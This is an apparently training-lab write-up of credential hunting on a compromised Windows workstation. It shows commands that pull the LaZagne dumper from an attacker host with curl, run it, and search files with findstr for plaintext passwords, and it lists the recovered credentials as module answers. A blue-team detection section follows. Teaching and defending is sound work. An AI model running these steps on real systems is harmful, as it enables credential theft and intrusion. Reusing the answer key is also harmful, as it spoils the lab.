# Overview

This lab simulates post-exploitation credential hunting on a compromised Windows 10 workstation (`ACADEMY-PWATTACKS-WIN10CHUNTING`). Starting with RDP access as the user `Bob`, the objective was to locate credentials stored across the filesystem - in documents, config files, automation scripts, and application credential stores - that enable lateral movement to switches, routers, a file server, a GitLab instance, and the domain.

## MITRE ATT&CK Mapping
- Credential Access
    - [T1552.001] Unsecured Credentials: Credentials In Files
    - [T1555] Credentials from Password Stores
    - [T1555.003] Credentials from Password Stores: Credentials from Web Browsers
    - [T1552.004] Unsecured Credentials: Private Keys
- Initial Access
    - [T1078] Valid Accounts
- Command and Control
    - [T1105] Ingress Tool Transfer
- Lateral Movement
    - [T1021.001] Remote Services: Remote Desktop Protocol

### Step-by-Step Walkthrough

#### Initial Access
- RDP'd into the target as `Bob` using the provided credentials.

    ```
    xfreerdp /v:10.129.202.99 /u:Bob /p:HTB_@cademy_stdnt!
    ```
    ```
    [WARN][com.freerdp.crypto] - CN = Laptop01
    WARNING: CERTIFICATE NAME MISMATCH!
    [...]
    ```
- Obtained an interactive session as **Bob** on **ACADEMY-PWATTACKS-WIN10CHUNTING** (`10.129.202.99`).

#### Credential Hunting - Automated (LaZagne / WinSCP)
- Downloaded LaZagne on the attack host.

    ```
    wget https://github.com/AlessandroZ/LaZagne/releases/latest/download/lazagne.exe
    ```
    ```
    [...] v2.4.7/lazagne.exe
    'lazagne.exe' saved
    ```
- Hosted it over HTTP.

    ```
    python3 -m http.server 8000
    ```
    ```
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
    10.129.202.99 - - [28/Nov/2026 02:46:10] "GET /lazagne.exe HTTP/1.1" 200 -
    ```
- Transferred it to the target.

    ```
    curl http://10.10.14.122:8000/lazagne.exe -o lazagne.exe
    ```
    ```
    100 9898k  100 9898k    0     0  9898k      0  0:00:01  0:00:01 --:--:-- 5608k
    ```
- Ran LaZagne and captured output.

    ```
    lazagne.exe > output.txt
    type output.txt
    ```
    ```
    ########## User: bob ##########
    ------------------- Winscp passwords -----------------
    [+] Password found !!!
    URL: 10.129.202.64
    Login: ubuntu
    Password: FSadmin123
    Port: 22
    ```
- Recovered the **WinSCP file-server credentials `ubuntu:FSadmin123`** (`10.129.202.64:22`).

#### Credential Hunting - File Contents (GitLab Access Code)
- Searched Bob's profile recursively for files containing the string "access code".

    ```
    findstr /SIM /C:"access code" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
    ```
    ```
    Desktop\WorkStuff\GitlabAccessCodeJustIncase.txt
    ```
- Read the identified file.

    ```
    type Desktop\WorkStuff\GitlabAccessCodeJustIncase.txt
    ```
    ```
    Gitlab access code just in case I lose connectivity with our local Gitlab instance.
    3z1ePfGbjWPsTfCsZfjy
    ```
- Recovered the **GitLab access code: `3z1ePfGbjWPsTfCsZfjy`**.

#### Credential Hunting - Stored Documents (Switches / DC)
- Located a password spreadsheet under `Desktop\WorkStuff\Creds\` and opened `passwords.ods`.

    ```
    Desktop\WorkStuff\Creds\passwords.ods
    ```
    ```
    Switches via SSH    admin         WellConnected123
    DC via RDP          bwilliamson   P@55w0rd!
    ```
- Recovered the **Switches SSH password `WellConnected123`** (user `admin`) and **DC RDP creds `bwilliamson:P@55w0rd!`**.

#### Credential Hunting - Automation Scripts (Edge-Router)
- Enumerated `C:\Automations&Scripts\AnsibleScripts\`, which contained a `.git` folder and an `EdgeRouterConfigs` Ansible playbook. Opened the playbook.

    ```
    type C:\Automations&Scripts\AnsibleScripts\EdgeRouterConfigs
    ```
    ```
    - name: Configure Interfaces Status
      user: "{ edgeadmin }"
      passwd: "{ Edge@dmin123!} "
    ```
- Recovered the **Edge-Router credentials `edgeadmin:Edge@dmin123!`**.

#### Credential Hunting - PowerShell Script (Domain Default Password)
- Reviewed `BulkaddADusers.ps1` in `WorkStuff`, a bulk Active Directory user-creation script.

    ```
    type C:\Automations&Scripts\BulkaddADusers.ps1
    ```
    ```
    Import-Module ActiveDirectory
    Import-Csv "C:\Users\bob\WorkStuff\NewUsers.csv" | ForEach-Object {
    [...]
    -AccountPassword (ConvertTo-SecureString "Inlanefreightisgreat2022" -AsPlainText -Force) `
    -ChangePasswordAtLogon $true
    [...]
    Add-ADGroupMember "Domain Admins" $_."samAccountName";
    ```
- Recovered the **default password for every newly created Inlanefreight domain account: `Inlanefreightisgreat2022`**. Note the script also adds each created user to **Domain Admins**.

#### Module Questions
- Switches via SSH password: **`WellConnected123`**
- GitLab access code: **`3z1ePfGbjWPsTfCsZfjy`**
- WinSCP file-server credentials: **`ubuntu:FSadmin123`**
- Default Inlanefreight domain user password: **`Inlanefreightisgreat2022`**
- Edge-Router credentials: **`edgeadmin:Edge@dmin123!`**

#### Investigation (Blue Team)

**1. Interactive Logon via RDP**
**Attack Step:** Authenticated to the workstation over RDP as a valid local user.

**Detection:**
- Windows Security log: Event ID 4624 (Type 10, RemoteInteractive) for user `Bob` from the attacker source IP.
- TerminalServices-RemoteConnectionManager / LocalSessionManager operational logs: Event IDs 1149, 21, 25 recording the remote session source.

**Investigation:**
- Correlate the 4624 Type 10 logon source address against known-good admin jump hosts; flag logons from unexpected subnets.
- Review session duration and the processes spawned under that session for the hunting activity below.

**2. Credential Hunting in Files**
**Attack Step:** Used `findstr` and manual browsing to locate plaintext credentials in documents, config files, and scripts.

**Detection:**
- Process creation (Event ID 4688 / Sysmon Event ID 1): `findstr.exe` with recursive flags and credential-themed search strings; `cmd.exe`/`explorer.exe` opening `.ods`, `.ps1`, and config files under `WorkStuff` and `Automations&Scripts`.
- File access auditing (Event ID 4663) on sensitive directories (`Creds`, `AnsibleScripts`) if object-access auditing is enabled.

**Investigation:**
- Review 4688 command lines for `findstr`/`Select-String` searching for terms like "password" and "access code".
- Identify which credential-bearing files were accessed and treat every credential in them as compromised; prioritize rotation of the Switches, DC, Edge-Router, GitLab, and domain default passwords.

**3. Tool Ingress and Credential Store Dumping (LaZagne)**
**Attack Step:** Transferred LaZagne via HTTP and executed it to dump stored application credentials (WinSCP).

**Detection:**
- Process creation (Event ID 4688 / Sysmon Event ID 1): execution of `lazagne.exe`; `curl.exe` retrieving an executable from an external HTTP server.
- Network connection logging (Sysmon Event ID 3): outbound connection from the workstation to the attacker host on port 8000.
- Registry access: LaZagne reads the WinSCP `Sessions` registry key under `HKCU\Software\Martin Prikryl\WinSCP 2\Sessions`.

**Investigation:**
- Flag any unsigned, newly dropped executable in `C:\Users\bob` executed shortly after an inbound file transfer.
- Review the WinSCP configuration for stored sessions; rotate the `ubuntu` file-server account and disable WinSCP credential saving where possible.
- Hunt the environment for the same LaZagne binary hash on other hosts.
